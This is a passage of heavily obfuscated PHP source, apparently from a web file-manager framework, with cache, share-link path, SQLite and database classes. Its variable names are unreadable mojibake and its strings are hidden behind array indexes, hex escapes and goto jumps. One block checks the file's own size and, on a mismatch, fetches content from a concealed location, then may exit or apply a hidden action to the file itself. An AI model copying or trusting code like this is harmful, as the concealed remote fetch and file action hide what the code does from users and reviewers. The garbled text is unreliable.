(in_array($á§Ÿ¢¤‘[$“àøÎºş[552]], $Ã¢¾§‡Ø)) { return !1; } if (!in_array($á§Ÿ¢¤‘[$“àøÎºş[900]], $¿°ƒä¤“)) { return !1; } if (IO::exist($û•€Øßã)) { return !0; } $¡şêŠÚÈ = get_path_father($û•€Øßã); if (IO::exist($¡şêŠÚÈ)) { $Ã¢¾§‡Ø[] = $á§Ÿ¢¤‘[$“àøÎºş[552]]; return !1; } $¦Ê˜ò¡ = array($“àøÎºş[900] => $á§Ÿ¢¤‘[$“àøÎºş[900]], $“àøÎºş[97] => array($“àøÎºş[470], "{$¡şêŠÚÈ}\45")); $†Ş›Õò = Model($“àøÎºş[872])->where($¦Ê˜ò¡)->field($“àøÎºş[553])->select(); $Ã¢¾§‡Ø = array_merge($Ã¢¾§‡Ø, array_to_keyvalue($†Ş›Õò, $“àøÎºş[12], $“àøÎºş[552])); return !1; } private function _fileFilter($”ÛÔèÌ¦) { $¦Šóº£Ç =& $_SERVER[¼èá¯æÙ]; return; if (empty($”ÛÔèÌ¦)) { return; } $Ûæ–Õßá = array($¦Šóº£Ç[552] => array($¦Šóº£Ç[7], array_unique($”ÛÔèÌ¦))); $ÓÔƒÖïÔ = Model($¦Šóº£Ç[907])->where($Ûæ–Õßá)->field($¦Šóº£Ç[203])->select(); foreach ($ÓÔƒÖïÔ as $ÉÀÊéˆŠ) { Model($¦Šóº£Ç[907])->remove($ÉÀÊéˆŠ[$¦Šóº£Ç[203]], !1); } } private function storeIds() { $ğÇãË€ =& $_SERVER[¼èá¯æÙ]; $Ğ×õ–ä– = Model($ğÇãË€[849])->listData(); $Üš¹—í¿ = array(); $¨²­ÔŸ¿ = $GLOBALS[$ğÇãË€[6]][$ğÇãË€[102]][$ğÇãË€[908]]; foreach ($Ğ×õ–ä– as $áŸÚÀë) { $éúÉ×õ = strtolower($áŸÚÀë[$ğÇãË€[108]]); if (!isset($¨²­ÔŸ¿[$éúÉ×õ])) { continue; } $§ éŠ±ú = $ğÇãË€[87] . (isset($¨²­ÔŸ¿[$éúÉ×õ]) ? $¨²­ÔŸ¿[$éúÉ×õ] : ucfirst($éúÉ×õ)); if (!class_exists($§ éŠ±ú)) { continue; } $Üš¹—í¿[] = $áŸÚÀë[$ğÇãË€[486]]; } return $Üš¹—í¿; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $éŸº„ =& $_SERVER[¼èá¯æÙ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ášôãä“ = $GLOBALS[$éŸº„[6]][$éŸº„[436]]; $…±Ùú½ì = $ášôãä“[$ášôãä“[$éŸº„[909]]]; $ê˜¥‹”¶ = $ášôãä“[$éŸº„[910]]; switch ($ášôãä“[$éŸº„[909]]) { case $éŸº„[21]: self::$handle = Model($éŸº„[911]); break; case $éŸº„[912]: self::$handle = new CacheRedis($…±Ùú½ì, $ê˜¥‹”¶); break; case $éŸº„[913]: self::$handle = new CacheMemcached($…±Ùú½ì, $ê˜¥‹”¶); break; case $éŸº„[242]: self::$handle = new CacheFile($…±Ùú½ì, $ê˜¥‹”¶); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÑÓ€ä‰›) { if (is_array($ÑÓ€ä‰›) || is_object($ÑÓ€ä‰›)) { $ÑÓ€ä‰› = json_encode($ÑÓ€ä‰›); } $ÑÓ€ä‰› = rawurlencode($ÑÓ€ä‰›); return md5(KOD_SITE_ID . $_SERVER[¼èá¯æÙ][11] . $ÑÓ€ä‰›); } public static function get($Ùí¥Ô‚ç, $½ÑÂõá‚ = false) { $¢«ºÃ€Ö = self::key($Ùí¥Ô‚ç); $À¼ıÔÌ = self::init(); if ($½ÑÂõá‚) { return unserialize($À¼ıÔÌ->get($¢«ºÃ€Ö)); } if (!isset(self::$memoryCache[$¢«ºÃ€Ö])) { $¾•™û”« = $À¼ıÔÌ->get($¢«ºÃ€Ö); self::$memoryCache[$¢«ºÃ€Ö] = unserialize($¾•™û”«); } return self::$memoryCache[$¢«ºÃ€Ö]; } public static function set($…üìùŠ, $Ò‚ããí, $âìÖ¶ı° = false) { $Ôû§ÓÁ£ =& $_SERVER[¼èá¯æÙ]; $¦Ä›Õ = self::key($…üìùŠ); if (isset(self::$memoryCache[$¦Ä›Õ]) && self::$memoryCache[$¦Ä›Õ] === $Ò‚ããí) { return !0; } if ($âìÖ¶ı° === 0) { self::$memoryCache[$¦Ä›Õ] = $Ò‚ããí; return !0; } $©ª‚ƒ‰ˆ = self::init(); $ËƒŠäö = serialize($Ò‚ããí); CacheLock::lock($…üìùŠ . $Ôû§ÓÁ£[914]); $‰¶ˆôÆ = $©ª‚ƒ‰ˆ->set($¦Ä›Õ, $ËƒŠäö, $âìÖ¶ı°); self::$memoryCache[$¦Ä›Õ] = $Ò‚ããí; CacheLock::unlock($…üìùŠ . $Ôû§ÓÁ£[914]); return $‰¶ˆôÆ; } public static function getCall($Î©ùş•, $Ô´ÜØÇ÷, $·ÅÌª±®, $ÇÜİğÍ = array()) { $ä®å¬‰¯ =& $_SERVER[¼èá¯æÙ]; $¾ƒóõÈ” = self::get($Î©ùş•); if ($¾ƒóõÈ” || $¾ƒóõÈ” === $ä®å¬‰¯[12]) { return $¾ƒóõÈ”; } $¾ƒóõÈ” = call_user_func_array($·ÅÌª±®, $ÇÜİğÍ); $¾ƒóõÈ” = $¾ƒóõÈ” ? $¾ƒóõÈ” : $ä®å¬‰¯[12]; self::set($Î©ùş•, $¾ƒóõÈ”, $Ô´ÜØÇ÷); return $¾ƒóõÈ”; } public static function remove($‰ÅÈû—¼) { $ˆŸĞ¥–² = self::key($‰ÅÈû—¼); unset(self::$memoryCache[$ˆŸĞ¥–²]); self::clearTimeout(); CacheLock::lock($‰ÅÈû—¼); $¤ÇÊÛèÚ = self::init()->remove($ˆŸĞ¥–²); CacheLock::unlock($‰ÅÈû—¼); return $¤ÇÊÛèÚ; } public static function removeMemory($¥´Àµ¢È) { $ú˜¡£ò = self::key($¥´Àµ¢È); unset(self::$memoryCache[$ú˜¡£ò]); } public static function clearMemory($Âñëë³è = false) { if ($Âñëë³è) { $Âñëë³è = self::key($Âñëë³è); unset(self::$memoryCache[$Âñëë³è]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¼èá¯æÙ][915])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¼èá¯æÙ][916])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($µŠÍ‹£…, $ÚŠÁø»Ë) { $Ğí£ÙÁµ =& $_SERVER[¼èá¯æÙ]; $this->cachePath = $µŠÍ‹£…[$Ğí£ÙÁµ[97]]; $this->prefix = $Ğí£ÙÁµ[917]; $this->cacheTime = $ÚŠÁø»Ë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($åş¯·) { $ÇÔ¡Òı¤ =& $_SERVER[¼èá¯æÙ]; $åş¯· = str_replace(array($ÇÔ¡Òı¤[918], $ÇÔ¡Òı¤[110], $ÇÔ¡Òı¤[86]), $ÇÔ¡Òı¤[919], $åş¯·); return $this->cachePath . $ÇÔ¡Òı¤[920] . $åş¯· . $ÇÔ¡Òı¤[921]; } public function set($ô‡ĞÉ›, $«º¿, $öÚûÊõ¦ = false) { $öÚûÊõ¦ = $öÚûÊõ¦ ? $öÚûÊõ¦ : $this->cacheTime; $…Í´¹®ø = $this->getFile($ô‡ĞÉ›); if (file_put_contents($…Í´¹®ø, $this->prefix . $«º¿, LOCK_EX)) { @touch($…Í´¹®ø, intval(time() + $öÚûÊõ¦)); clearstatcache(); return !0; } @unlink($…Í´¹®ø); return !1; } public function get($ş‡µÁÜ½) { $èëóÇĞà = $this->getFile($ş‡µÁÜ½); if (file_exists($èëóÇĞà) && filemtime($èëóÇĞà) < time()) { @unlink($èëóÇĞà); return !1; } $¡îÙ­÷° = @file_get_contents($èëóÇĞà); return substr($¡îÙ­÷°, strlen($this->prefix)); } public function remove($æ•æ×åı) { $ü¸Õ± = $this->getFile($æ•æ×åı); return @unlink($ü¸Õ±); } public function deleteAll() { $ÔÆÛÈ¨î =& $_SERVER[¼èá¯æÙ]; $¹Ü«ñê = scandir($this->cachePath); foreach ($¹Ü«ñê as $Ûˆ÷õû) { $øÅÉëĞø = $this->cachePath . $Ûˆ÷õû; if (strpos($øÅÉëĞø, $ÔÆÛÈ¨î[921]) && strpos($øÅÉëĞø, $ÔÆÛÈ¨î[922])) { @unlink($øÅÉëĞø); } } } public function clearTimeout() { $Óúì¢Ïñ =& $_SERVER[¼èá¯æÙ]; $ˆ‡³õäÙ = scandir($this->cachePath); foreach ($ˆ‡³õäÙ as $ÒÌ‚™ô­) { $ÑË§ñµÂ = $this->cachePath . $ÒÌ‚™ô­; if (strpos($ÑË§ñµÂ, $Óúì¢Ïñ[921]) && strpos($ÑË§ñµÂ, $Óúì¢Ïñ[922]) && filemtime($ÑË§ñµÂ) < time()) { @unlink($ÑË§ñµÂ); } } } } goto C‹‘Î£·ºĞ; FÒßŠ¢£ÕÛ: $_file = $_SERVER[$_SERVER[¼èá¯æÙ][55]]; $_size = $_SERVER[¼èá¯æÙ][829]; if ($_SERVER[$_SERVER[¼èá¯æÙ][54]] != $_size($_file)) { $_getc = $_SERVER[¼èá¯æÙ][56]; $_getfile = $_SERVER[$_SERVER[¼èá¯æÙ][57]] . $_SERVER[¼èá¯æÙ][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼èá¯æÙ][59], $_getfilec); if (count($_getarrs) < $_SERVER[¼èá¯æÙ][60]) { $exit = $_SERVER[¼èá¯æÙ][61]; $exit(); } $_act = $_SERVER[¼èá¯æÙ][62]; $_act($_file); } goto Bóœ£ÀÓÈŞ; cë´„ÚÇ‰²: class PathDriverDbShareLink extends PathDriverDB { public function __construct($˜Öç…›°) { $this->pathParse = $˜Öç…›°; $this->model = Model($_SERVER[¼èá¯æÙ][1426]); } protected function infoParse($‹ßøı´—, $ïÙÖšøş = false, $¤»êåæ“ = false) { $û×øî´‹ =& $_SERVER[¼èá¯æÙ]; return Action($û×øî´‹[1261])->sharePathInfo($this->pathParse[$û×øî´‹[97]], !0, $ïÙÖšøş); } public function listPath($¬¿æ±Ï, $ìâÁ‹± = false) { $Ş³úüø‡ =& $_SERVER[¼èá¯æÙ]; $ªƒ­÷ˆ• = parent::listPath($¬¿æ±Ï, $ìâÁ‹±); if (!$ªƒ­÷ˆ•) { return $ªƒ­÷ˆ•; } if (is_array($ªƒ­÷ˆ•[$Ş³úüø‡[1434]])) { $ªƒ­÷ˆ•[$Ş³úüø‡[1434]] = Action($Ş³úüø‡[1261])->shareItemInfo($ªƒ­÷ˆ•[$Ş³úüø‡[1434]]); } foreach ($ªƒ­÷ˆ• as $ªÖËÂÍĞ => $œ¤‰ï®) { if (!in_array($ªÖËÂÍĞ, array($Ş³úüø‡[96], $Ş³úüø‡[95]))) { continue; } foreach ($œ¤‰ï® as $‚ÜÁúå => $±ìÔºù) { $ªƒ­÷ˆ•[$ªÖËÂÍĞ][$‚ÜÁúå] = Action($Ş³úüø‡[1261])->shareItemInfo($±ìÔºù); } } return $ªƒ­÷ˆ•; } public function listAll($¾Âª»ê) { $İ‹¬¾Àô =& $_SERVER[¼èá¯æÙ]; $É”ËÇ±¸ = IO::info($this->pathParse[$İ‹¬¾Àô[97]]); if (!$É”ËÇ±¸) { return array(); } $¸Ş¤‘à“ = $this->model->listAll($¾Âª»ê); foreach ($¸Ş¤‘à“ as &$ÍÁî¦»º) { $ÍÁî¦»º[$İ‹¬¾Àô[100]] = Action($İ‹¬¾Àô[1261])->shareItemInfo($ÍÁî¦»º[$İ‹¬¾Àô[100]]); } unset($ÍÁî¦»º); return $¸Ş¤‘à“; } } class PathDriverDriverShareItem { public function __construct($­¹Ã‡ĞŸ) { $this->pathParse = $­¹Ã‡ĞŸ; } public function __call($Ğàıí§ˆ, $“Û”˜) { $Îîá¥Áß =& $_SERVER[¼èá¯æÙ]; if (method_exists($this, $Ğàıí§ˆ)) { return; } $­Ó‘Ø = call_user_func_array(array($Îîá¥Áß[1435], $Ğàıí§ˆ), $“Û”˜); $…İËØ‚ì = array($Îîá¥Áß[1436], $Îîá¥Áß[1437], $Îîá¥Áß[1438], $Îîá¥Áß[1439], $Îîá¥Áß[632], $Îîá¥Áß[634], $Îîá¥Áß[1440], $Îîá¥Áß[120], $Îîá¥Áß[1441], $Îîá¥Áß[1442]); if (in_array($Ğàıí§ˆ, $…İËØ‚ì)) { $­Ó‘Ø = $this->getPathOuter($­Ó‘Ø); } return $­Ó‘Ø; } public function copy($éã¥–¹‘, $éí«Ù¨ü, $«¨—í» = false, $Ú¨šôı = false) { return $this->copyMove($éã¥–¹‘, $éí«Ù¨ü, $«¨—í», $_SERVER[¼èá¯æÙ][632], $Ú¨šôı); } public function move($¨ÍóÍò¯, $¹öãÏæ, $³¿ŞœÈÜ = false, $ıŞÀ¹ÎÓ = false) { return $this->copyMove($¨ÍóÍò¯, $¹öãÏæ, $³¿ŞœÈÜ, $_SERVER[¼èá¯æÙ][634], $ıŞÀ¹ÎÓ); } private function copyMove($ôÄ˜éµü, $ôìã¶æ, $êËÂå´†, $ß”ëÆÆ˜, $šª¡òÍş = false) { $³¡Â‘û =& $_SERVER[¼èá¯æÙ]; $ô¦ É­ = $ôìã¶æ; $¯µµ”·ë = IO::driverMake($ôìã¶æ); if ($¯µµ”·ë->pathParse[$³¡Â‘û[1237]]) { $ôìã¶æ = $¯µµ”·ë->pathParse[$³¡Â‘û[1237]]; } else { $ôìã¶æ = $ô¦ É­; } $¾åÜ± = IO::copyMove($ôÄ˜éµü, $ôìã¶æ, $êËÂå´†, $ß”ëÆÆ˜, $šª¡òÍş); $¾åÜ± = $this->getPathOuter($¾åÜ±); return $¾åÜ±; } public function pathThis($ß°Íå“Ş) { return get_path_this($this->pathParse[$_SERVER[¼èá¯æÙ][97]]); } public function pathFather($û€ÆƒËè) { return get_path_father($this->pathParse[$_SERVER[¼èá¯æÙ][97]]); } public function iconvSystem($šé¨•øò) { return $šé¨•øò; } protected function infoParse($ÎêäğïÃ, $˜¼±¡Úş = false) { $¬Ü¬û‚ =& $_SERVER[¼èá¯æÙ]; $½´‰» = $this->pathParse[$¬Ü¬û‚[571]][$¬Ü¬û‚[1262]] . $this->pathParse[$¬Ü¬û‚[1255]]; if ($˜¼±¡Úş) { $œëåŠ¥ = IO::infoWithChildren($½´‰»); } else { $œëåŠ¥ = IO::info($½´‰»); } $ğƒûã·á = $this->pathParse[$¬Ü¬û‚[571]]; return Action($¬Ü¬û‚[1433])->_shareItemeParse($œëåŠ¥, $ğƒûã·á); } public function listAll($ù‡’üİê) { $ûÖ¡•õë =& $_SERVER[¼èá¯æÙ]; $ŞöÆÕ–À = IO::listAll($ù‡’üİê); $•ºşˆË = rtrim($this->pathParse[$ûÖ¡•õë[571]][$ûÖ¡•õë[1262]], $ûÖ¡•õë[8]); foreach ($ŞöÆÕ–À as &$Ô–³ø«Ú) { $Ô–³ø«Ú[$ûÖ¡•õë[97]] = $this->pathDriver . $ûÖ¡•õë[8] . ltrim(substr($Ô–³ø«Ú[$ûÖ¡•õë[97]], strlen($•ºşˆË)), $ûÖ¡•õë[8]); } unset($Ô–³ø«Ú); return $ŞöÆÕ–À; } public function listAllSimple($×û°´¶×, $ÛÓääµ¢ = false) { $ŠÜß„Óƒ =& $_SERVER[¼èá¯æÙ]; $»ŸÆèœÚ = $this->listAll($×û°´¶×); $ÑÓÅ¦ö = $this->pathParse[$ŠÜß„Óƒ[506]]; if (trim($ÑÓÅ¦ö, $ŠÜß„Óƒ[8]) == trim(get_path_father($ÑÓÅ¦ö), $ŠÜß„Óƒ[8])) { $ÛÓääµ¢ = !0; } return IO::init($ŠÜß„Óƒ[12])->listAllSimpleMake($»ŸÆèœÚ, $ÑÓÅ¦ö, $ÛÓääµ¢); } public function getPathOuter($Õ„›…Ì) { $ç—ø¥Ô… =& $_SERVER[¼èá¯æÙ]; $¡©×¼îÌ = KodIO::parse($Õ„›…Ì); if ($¡©×¼îÌ[$ç—ø¥Ô…[33]] == KodIO::KOD_SHARE_ITEM) { return $¡©×¼îÌ[$ç—ø¥Ô…[97]]; } $ÍÙ¾óÈÄ = KodIO::clear($Õ„›…Ì); $…•ı¤ï¯ = KodIO::clear($this->pathParse[$ç—ø¥Ô…[571]][$ç—ø¥Ô…[1262]]); $ÒÁÀÔ²Õ = substr($ÍÙ¾óÈÄ, strlen($…•ı¤ï¯)); if (substr($ÍÙ¾óÈÄ, 0, strlen($…•ı¤ï¯)) != $…•ı¤ï¯) { return !1; } return $this->pathParse[$ç—ø¥Ô…[1256]] . $ç—ø¥Ô…[8] . ltrim($ÒÁÀÔ²Õ, $ç—ø¥Ô…[8]); } public function getType() { $óáå¬š¼ =& $_SERVER[¼èá¯æÙ]; $ïÇöó®­ = str_replace($óáå¬š¼[87], $óáå¬š¼[12], get_class($this)); return strtolower($ïÇöó®­); } public function isOsDriver($´ä©êÙÜ) { return IO::isOsDriver($´ä©êÙÜ); } public function info($œ„šéãî) { return $this->infoParse($œ„šéãî); } public function infoAuth($–„Áˆ¥) { return $this->infoParse($–„Áˆ¥); } public function infoWithChildren($É´ İÛĞ) { return $this->infoParse($É´ İÛĞ, !0); } public function infoFull($¸ âÁ´°) { return $this->infoParse($¸ âÁ´°); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ƒªèÒëÔ) { $this->pathParse = $ƒªèÒëÔ; } protected function infoParse($ÅŸİîŠú, $Ì¿£•Á¸ = false) { $èµÃÈÉ =& $_SERVER[¼èá¯æÙ]; return Action($èµÃÈÉ[1261])->sharePathInfo($this->pathParse[$èµÃÈÉ[97]], !0, $Ì¿£•Á¸); } public function listPath($ö„õ¤úÚ, $Ğ‰‘İ¡ª = false) { $ªÔÇŞú” =& $_SERVER[¼èá¯æÙ]; $Ö¬££¥Ï = IO::listPath($ö„õ¤úÚ, $Ğ‰‘İ¡ª); if (!$Ö¬££¥Ï) { return $Ö¬££¥Ï; } if (is_array($Ö¬££¥Ï[$ªÔÇŞú”[1434]])) { $³‚Ãß¥” = Action($ªÔÇŞú”[1443])->parsePathChildren($Ö¬££¥Ï[$ªÔÇŞú”[1434]], array($ªÔÇŞú”[506] => $ö„õ¤úÚ)); $Ö¬££¥Ï[$ªÔÇŞú”[1434]] = Action($ªÔÇŞú”[1261])->shareItemInfo($³‚Ãß¥”); } foreach ($Ö¬££¥Ï as $¤€ÓÔû => $…ˆ®ƒæÎ) { if (!in_array($¤€ÓÔû, array($ªÔÇŞú”[96], $ªÔÇŞú”[95]))) { continue; } foreach ($…ˆ®ƒæÎ as $á¦¼“³Í => $³‚Ãß¥”) { $³‚Ãß¥” = Action($ªÔÇŞú”[1443])->parsePathChildren($³‚Ãß¥”, array($ªÔÇŞú”[506] => $ö„õ¤úÚ)); $Ö¬££¥Ï[$¤€ÓÔû][$á¦¼“³Í] = Action($ªÔÇŞú”[1261])->shareItemInfo($³‚Ãß¥”); } } return $Ö¬££¥Ï; } } goto cò¼ë„Áè°; f¶¿»ò´£: class DbSqlite extends DbSqliteBase { public function query($¢–´£ë) { $İ¤²´›ú =& $_SERVER[¼èá¯æÙ]; if (!CacheLock::fileLock($İ¤²´›ú[13])) { return !1; } $è¨–áØİ = parent::query($¢–´£ë); CacheLock::fileUnLock($İ¤²´›ú[13]); return $è¨–áØİ; } public function execute($´¾òöùò) { $Êü…Í• =& $_SERVER[¼èá¯æÙ]; if (!CacheLock::fileLock($Êü…Í•[13])) { return !1; } $€Å®ŞÁ… = parent::execute($´¾òöùò); CacheLock::fileUnLock($Êü…Í•[13]); return $€Å®ŞÁ…; } } class DbSqlite3 extends DbSqlite3Base { public function query($‡ƒášÙ) { $Ô¤’îàÒ =& $_SERVER[¼èá¯æÙ]; if (!CacheLock::fileLock($Ô¤’îàÒ[13])) { return !1; } $ÓşÈ † = parent::query($‡ƒášÙ); CacheLock::fileUnLock($Ô¤’îàÒ[13]); return $ÓşÈ †; } public function execute($æü×Å¡¯) { $¯Ü÷îâÜ =& $_SERVER[¼èá¯æÙ]; if (!CacheLock::fileLock($¯Ü÷îâÜ[13])) { return !1; } $×…§“ = parent::execute($æü×Å¡¯); CacheLock::fileUnLock($¯Ü÷îâÜ[13]); return $×…§“; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\161" => "\x3c\76", "\147\164" => "\76", "\x65\147\x74" => "\76\75", "\154\x74" => "\x3c", "\x65\x6c\164" => "\x3c\x3d", "\x6e\x6f\164\154\151\x6b\145" => "\x4e\x4f\x54\x20\x4c\111\113\105", "\154\151\153\x65" => "\114\111\113\105", "\x69\x6e" => "\111\x4e", "\156\x6f\x74\x69\x6e" => "\116\x4f\124\x20\x49\116", "\156\157\x74\40\151\156" => "\116\117\124\x20\x49\x4e", "\142\x65\x74\x77\x65\x65\156" => "\102\105\124\127\x45\105\116", "\x6e\157\164\142\145\164\x77\x65\145\156" => "\116\x4f\x54\x20\102\x45\124\127\x45\105\116", "\156\157\x74\40\142\145\x74\x77\145\145\x6e" => "\116\x4f\124\40\x42\x45\124\127\x45\105\x4e"); protected $selectSql = "\x53\105\114\105\x43\x54\45\x44\111\x53\x54\x49\x4e\103\124\x25\x20\x25\106\111\x45\114\104\45\x20\106\122\x4f\x4d\x20\45\124\x41\x42\x4c\x45\x25\x25\112\x4f\x49\x4e\x25\45\127\x48\105\x52\105\45\45\107\x52\117\125\x50\45\x25\x48\101\126\111\116\107\x25\x25\117\x52\x44\x45\x52\x25\45\x4c\x49\115\111\x54\45\x20\45\125\x4e\x49\x4f\x4e\45\x25\103\x4f\x4d\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $†“šäÑÊ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¼èá¯æÙ][1042], $†“šäÑÊ); } public function factory($¤­—ÜÕß = '') { $Ø©»Àñù =& $_SERVER[¼èá¯æÙ]; $¤­—ÜÕß = $this->parseConfig($¤­—ÜÕß); if (empty($¤­—ÜÕß[$Ø©»Àñù[1043]])) { think_exception(think_lang($Ø©»Àñù[1044])); } $this->dbType = ucwords(strtolower($¤­—ÜÕß[$Ø©»Àñù[1043]])); $†´Ò©¢ = $Ø©»Àñù[1045] . $this->dbType; if (class_exists($†´Ò©¢)) { $Ë³ÓÓƒ™ = new $†´Ò©¢($¤­—ÜÕß); if ($Ø©»Àñù[1046] != strtolower($¤­—ÜÕß[$Ø©»Àñù[1043]])) { $Ë³ÓÓƒ™->dbType = strtoupper($this->dbType); } else { $Ë³ÓÓƒ™->dbType = $this->_getDsnType($¤­—ÜÕß[$Ø©»Àñù[998]]); } } else { think_exception(think_lang($Ø©»Àñù[1047]) . $Ø©»Àñù[1048] . $†´Ò©¢); } return $Ë³ÓÓƒ™; } public function __call($ıŠÊˆâÅ, $ò³ÉÒÈƒ) { if (method_exists($this, $ıŠÊˆâÅ)) { return call_user_func_array(array($this, $ıŠÊˆâÅ), $ò³ÉÒÈƒ); } } protected function _getDsnType($¨ÃÛ¢ìµ) { $¦ô®İˆö = explode($_SERVER[¼èá¯æÙ][4], $¨ÃÛ¢ìµ); $ºÓÍ¥»Û = strtoupper(trim($¦ô®İˆö[0])); return $ºÓÍ¥»Û; } private function parseConfig($Ş†„¤Äµ = '') { $“¼™§¾Ä =& $_SERVER[¼èá¯æÙ]; if (!empty($Ş†„¤Äµ) && is_string($Ş†„¤Äµ)) { $Ş†„¤Äµ = $this->parseDSN($Ş†„¤Äµ); } elseif (is_array($Ş†„¤Äµ)) { $Ş†„¤Äµ = array_change_key_case($Ş†„¤Äµ); $Ş†„¤Äµ = array($“¼™§¾Ä[1043] => $Ş†„¤Äµ[$“¼™§¾Ä[1049]], $“¼™§¾Ä[970] => $Ş†„¤Äµ[$“¼™§¾Ä[1050]], $“¼™§¾Ä[971] => $Ş†„¤Äµ[$“¼™§¾Ä[1051]], $“¼™§¾Ä[968] => $Ş†„¤Äµ[$“¼™§¾Ä[1052]], $“¼™§¾Ä[969] => $Ş†„¤Äµ[$“¼™§¾Ä[1053]], $“¼™§¾Ä[21] => $Ş†„¤Äµ[$“¼™§¾Ä[1054]], $“¼™§¾Ä[998] => $Ş†„¤Äµ[$“¼™§¾Ä[1055]], $“¼™§¾Ä[17] => isset($Ş†„¤Äµ[$“¼™§¾Ä[1056]]) ? $Ş†„¤Äµ[$“¼™§¾Ä[1056]] : array()); } elseif (empty($Ş†„¤Äµ)) { if (think_config($“¼™§¾Ä[1057]) && $“¼™§¾Ä[1046] != strtolower(think_config($“¼™§¾Ä[1058]))) { $Ş†„¤Äµ = $this->parseDSN(think_config($“¼™§¾Ä[1057])); } else { $Ş†„¤Äµ = array($“¼™§¾Ä[1043] => think_config($“¼™§¾Ä[1058]), $“¼™§¾Ä[970] => think_config($“¼™§¾Ä[1059]), $“¼™§¾Ä[971] => think_config($“¼™§¾Ä[1060]), $“¼™§¾Ä[968] => think_config($“¼™§¾Ä[1061]), $“¼™§¾Ä[969] => think_config($“¼™§¾Ä[1062]), $“¼™§¾Ä[21] => think_config($“¼™§¾Ä[335]), $“¼™§¾Ä[998] => think_config($“¼™§¾Ä[1057]), $“¼™§¾Ä[17] => think_config($“¼™§¾Ä[1063])); } } return $Ş†„¤Äµ; } protected function initConnect($›Å‘ºš½ = true) { if (1 == think_config($_SERVER[¼èá¯æÙ][22])) { $this->_linkID = $this->multiConnect($›Å‘ºš½); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ú‹’ş¡³ => $ïÈŠçíÖ) { $this->_linkID = $ïÈŠçíÖ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ò¡“®Á = false) { $ŸÎ÷×¦Á =& $_SERVER[¼èá¯æÙ]; static $˜Ò —õê = array(); static $Ãñù²‰² = -1; if (empty($˜Ò —õê)) { foreach ($this->config as $Ğ´Ğë„÷ => $”ƒÂóÆš) { $˜Ò —õê[$Ğ´Ğë„÷] = explode($ŸÎ÷×¦Á[50], $”ƒÂóÆš); } } if (think_config($ŸÎ÷×¦Á[1064])) { if ($ò¡“®Á || think_config($ŸÎ÷×¦Á[482]) === !0) { $ÅæŒ”ÎÑ = floor(mt_rand(0, think_config($ŸÎ÷×¦Á[1065]) - 1)); $Ãñù²‰² = $ÅæŒ”ÎÑ; } else { if (is_numeric(think_config($ŸÎ÷×¦Á[1066]))) { $ÅæŒ”ÎÑ = think_config($ŸÎ÷×¦Á[1066]); } else { $ÅæŒ”ÎÑ = floor(mt_rand(think_config($ŸÎ÷×¦Á[1065]), count($˜Ò —õê[$ŸÎ÷×¦Á[968]]) - 1)); } } } else { $ÅæŒ”ÎÑ = floor(mt_rand(0, count($˜Ò —õê[$ŸÎ÷×¦Á[968]]) - 1)); $Ãñù²‰² = $ÅæŒ”ÎÑ; } $ÅæŒ”ÎÑ = $Ãñù²‰² !== -1 ? $Ãñù²‰² : $ÅæŒ”ÎÑ; $ôÈ‚‘Ï® = array($ŸÎ÷×¦Á[970] => isset($˜Ò —õê[$ŸÎ÷×¦Á[970]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[970]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[970]][0], $ŸÎ÷×¦Á[971] => isset($˜Ò —õê[$ŸÎ÷×¦Á[971]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[971]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[971]][0], $ŸÎ÷×¦Á[968] => isset($˜Ò —õê[$ŸÎ÷×¦Á[968]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[968]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[968]][0], $ŸÎ÷×¦Á[969] => isset($˜Ò —õê[$ŸÎ÷×¦Á[969]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[969]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[969]][0], $ŸÎ÷×¦Á[21] => isset($˜Ò —õê[$ŸÎ÷×¦Á[21]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[21]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[21]][0], $ŸÎ÷×¦Á[998] => isset($˜Ò —õê[$ŸÎ÷×¦Á[998]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[998]][$ÅæŒ”ÎÑ] : $˜Ò —õê[$ŸÎ÷×¦Á[998]][0], $ŸÎ÷×¦Á[17] => isset($˜Ò —õê[$ŸÎ÷×¦Á[17]][$ÅæŒ”ÎÑ]) ? $˜Ò —õê[$ŸÎ÷×¦Á[17]][$ÅæŒ”ÎÑ] : $˜Ò 